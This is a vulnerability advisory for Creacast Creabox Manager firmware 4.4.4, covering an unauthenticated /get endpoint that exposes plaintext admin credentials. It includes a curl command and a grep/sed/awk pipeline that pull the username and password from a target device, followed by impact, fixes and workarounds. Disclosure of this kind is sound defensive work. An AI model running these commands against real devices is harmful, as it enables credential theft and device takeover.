# Creacast Creabox Manager - Information Disclosure Vulnerability

## Description
Creacast Creabox Manager exposes sensitive configuration data via a publicly accessible endpoint `/get`.  
When accessed, this endpoint returns internal configuration including the `creacodec.lua` file, which contains plaintext admin credentials.

---

## Vendor Information

- **Vendor**: CREACAST  
- **Vendor Homepage**: http://www.creacast.com/

## Product
- **Name**: Creacast Creabox Manager
- **Firmware Version**: 4.4.4

## Vulnerability Type
- Information Disclosure via Insecure Endpoint

## Attack Vector
- Network (HTTP)

---


## Vulnerable Endpoint
- `GET /get`

---

## Exploitation

### Manual Exploit
```bash
curl "http://<target-ip>/get"
```
### This returns contents including:
```
flux_arcenciel = "http://admin:supersecret@internal.stream"
```
### Extract Credentials Automatically
```bash
curl "http://<target-ip>/get" \
| grep -Eo 'flux_arcenciel\s*=\s*"http://([^:]+):([^@]+)@' \
| sed 's#flux_arcenciel = "http://##;s#@.*##' \
| awk -F: '{print "username=" $1 ", password=" $2}'
```
### ✅ This outputs:
```
username=admin, password=supersecret
```
---
## Proof of Concept (PoC) for(RCE,Information Disclosure,Authentication Bypass)
https://github.com/user-attachments/assets/de63e189-2137-4521-8a32-8dc9502ae13a

---

## Impact

    * Disclosure of plaintext admin credentials

    * Unauthorized access to the device and streaming infrastructure

    * Potential takeover of audio/video streams or full administrative control
---

## Suggested Fixes

    * Restrict access to the /get endpoint using authentication

    * Remove hardcoded credentials and configuration exposure from public endpoints

    * Sanitize and limit the information returned by /get

    * Store sensitive configuration server-side and obfuscate user-facing outputs

---

## Workarounds

    * Block external access to the /get endpoint via firewall or reverse proxy rules

    * Monitor for suspicious or repetitive access attempts to /get
